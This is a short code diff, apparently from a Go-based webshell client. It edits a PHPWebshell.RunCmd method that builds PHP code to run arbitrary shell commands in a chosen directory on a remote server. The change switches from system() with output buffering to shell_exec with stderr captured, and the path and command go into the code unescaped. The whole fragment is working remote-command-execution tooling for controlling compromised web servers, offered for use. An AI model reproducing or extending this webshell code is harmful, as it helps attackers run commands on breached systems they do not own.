@@ -58,13 +58,13 @@ echo $jsonData;  `
 // }
 func (p *PHPWebshell) RunCmd(path string, cmd string) []byte {
 	code := fmt.Sprintf(`
-ob_start();
-system("cd %s && %s");
-$output = ob_get_clean();
-if(!preg_match('//u', $output)){
-	$output = iconv('GB2312', 'UTF-8//IGNORE', $output);
+
+$output=shell_exec("cd %s & %s 2>&1 ");
+if(!preg_match('//u',$output)){
+$output=iconv('GB2312','UTF-8//IGNORE', $output);
 }
-echo nl2br($output);
+echo $output;
+
 `, path, cmd)
 	return []byte(code)
 }
